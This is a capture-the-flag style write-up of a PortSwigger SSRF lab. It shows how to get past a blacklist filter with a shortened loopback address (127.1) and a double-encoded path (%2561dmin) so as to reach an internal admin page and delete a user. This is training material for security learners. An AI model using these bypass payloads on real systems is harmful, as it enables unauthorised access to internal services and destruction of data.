# Lab Writeup: SSRF with blacklist-based input filter

URL: https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-with-blacklist-filter#

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Solution

1. View details on one of the items in homepage
2. Click check stock and send the POST request to burp repeater
3. First, try changing the `stockApi` value of the request to `127.1` which is the substitute for `127.0.0.1` then change the first character of `/admin` which is the `a` to become `%2561` so the full path would be `http://127.1/%2561dmin` then you'll see `carlos` delete link in the response

   ```
   <section>
        <h1>Users</h1>
        <div>
            <span>wiener - </span>
            <a href="/admin/delete?username=wiener">Delete</a>
        </div>
        <div>
            <span>carlos - </span>
            <a href="/admin/delete?username=carlos">Delete</a>
        </div>
    </section>
   ```

4. Change the `stockApi` value to `http://127.1/%2561dmin/delete?username=carlos`
5. Send the request and the challenge should be solved

   ![Blacklist Filter Backend SSRF](/assets/blacklist-filter-backend-ssrf.png)
